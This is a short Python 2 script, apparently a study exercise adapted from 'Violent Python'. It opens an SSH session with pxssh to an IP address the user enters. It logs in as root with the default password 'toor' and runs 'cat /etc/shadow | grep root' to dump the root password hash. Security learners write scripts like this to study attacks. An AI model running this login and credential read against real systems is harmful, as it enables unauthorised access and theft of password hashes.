# SSH_bot_pxssh.py
#
#	Des:	Same function as SSH_bot_pexpect.py, but utilizes
#			pxssh from pexpect. Requires 'sudo' to work.
#	Status: Functional-WIP
#
#	Ref: Violent Python, TJ O'Conner (Modified)
#
#	LU: 12/24/15

from pexpect import pxssh

def send_command(s, cmd):
	s.sendline(cmd)
	s.prompt()
	print s.before

def connect(host, user, password):
	try:
		s = pxssh.pxssh() # Initialize pxssh object?
		s.login(host, user, password)
		return s

	except pxssh.ExceptionPxssh, e:
		print "[-] Error establishing SSH connection."
		print "[-] Details: "+str(e)
		exit(0)

def main():
	leIP = raw_input("Please type in the IP address: ")
	s = connect(str(leIP), 'root', 'toor')
	send_command(s, "cat /etc/shadow | grep root")

if __name__ == "__main__":
	main()